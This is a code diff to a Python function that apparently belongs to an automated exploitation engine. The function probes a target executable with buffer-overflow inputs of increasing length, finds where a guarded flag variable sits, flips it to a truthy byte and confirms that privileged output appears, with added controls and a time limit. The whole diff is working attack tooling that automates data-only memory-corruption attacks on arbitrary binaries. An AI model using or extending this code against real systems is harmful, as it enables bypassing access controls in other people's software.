@@ -196,29 +196,46 @@ def _tokens(out: bytes) -> set:
 
 def discover_data_only(exe: str, *, benign: bytes = b"a\n", max_distance: int = 256,
                        input_mode: str = "stdin", argv: Optional[list] = None,
-                       flip: bytes = b"\x01", timeout: float = 8.0):
+                       flip: bytes = b"\x01", alt_flip: bytes = b"\x7f", timeout: float = 8.0,
+                       deadline_s: Optional[float] = None):
     """Fully hands-off DOP: DISCOVER both the privileged signal and the buffer->variable distance.
     No marker is supplied. The privileged path is whatever stable, printable output the overflow
     makes appear that a BENIGN run does not -- so we diff against the benign baseline rather than
-    knowing the secret in advance. Soundness is preserved: a candidate token must (1) appear under
-    the full overflow, (2) be absent from the benign baseline, (3) be absent from the negative
-    control (the same overflow one byte short of the variable -> not our write), and (4) reproduce
-    on a second overflow run (reject one-off corruption garbage). Returns (FlagFlipPlan, token) or
-    (None, None). Bounded by max_distance.
+    knowing the secret in advance.
 
-    This turns the data-only chain hands-off: the earlier detonate_data_only needs the caller to
-    name the privileged marker; here the engine finds it, which is what lets DOP fire on a target
-    whose guarded output we do not know up front."""
-    base = _tokens(_run(exe, benign, input_mode=input_mode, argv=argv, timeout=timeout))
+    Soundness (forgery-proof against echoing / length-dependent targets): every control has the SAME
+    LENGTH as the payload and differs from it only in the value written over the variable, so output
+    that merely reflects input length or echoes input cannot differ between them. A candidate token
+    must (1) appear under the flip, (2) be absent from the benign baseline, (3) be absent from the
+    same-length ZERO-byte control (the variable overwritten with a falsy value -> the write is the
+    cause), (4) also appear under a DIFFERENT truthy flip value (rejects targets that render the byte
+    itself, e.g. 'got 0x01'), and (5) reproduce on a second run. Returns (FlagFlipPlan, token) or
+    (None, None). Bounded by max_distance and, when given, deadline_s wall-clock seconds.
+
+    Recall trade-off, deliberate: a gate that tests `== 1` exactly is missed by rule (4)."""
+    import time as _time
+    t_end = (_time.monotonic() + deadline_s) if deadline_s else None
+    out = lambda data: _run(exe, data, input_mode=input_mode, argv=argv, timeout=timeout)  # noqa: E731
+    # Controls are compared by RAW SUBSTRING, not token-set difference: the flip byte can split a
+    # printable run ('hello A\x01!' -> 'hello A') that the control prints whole ('hello A!').
+    fresh = lambda toks, ctrl: {t for t in toks if t not in ctrl}  # noqa: E731
+    base = out(benign)
     for d in range(1, max_distance + 1):
+        if t_end is not None and _time.monotonic() > t_end:
+            break
         plan = plan_flag_flip(d, flip=flip)
-        pos = _tokens(_run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout))
-        cand = pos - base
+        pad = plan.negative
+        cand = fresh(_tokens(out(plan.payload)), base)
         if not cand:
             continue
-        neg = _tokens(_run(exe, plan.negative, input_mode=input_mode, argv=argv, timeout=timeout))
-        pos2 = _tokens(_run(exe, plan.payload, input_mode=input_mode, argv=argv, timeout=timeout))
-        for tok in sorted(cand - neg):
-            if tok in pos2:                              # stable across runs, caused by our write
+        cand = fresh(cand, out(pad + b"\x00"))          # same length, falsy write
+        if not cand:
+            continue
+        cand &= _tokens(out(pad + alt_flip))             # a different truthy write, same effect
+        if not cand:
+            continue
+        cand &= _tokens(out(plan.payload))               # stable across runs
+        for tok in sorted(cand):
+            if alt_flip not in tok and flip not in tok:   # never a token carrying our own bytes
                 return plan, tok
     return None, None
